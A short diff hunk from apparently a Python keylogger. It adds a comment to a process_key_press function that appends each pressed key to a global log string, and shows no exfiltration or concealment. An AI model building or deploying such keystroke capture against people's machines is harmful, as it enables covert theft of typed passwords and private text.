@@ -8,6 +8,7 @@ def process_key_press(key):
     global log
     try:
         log = log + str(key.char)
+        # store each key as a character into log
         
     except AttributeError:
     #
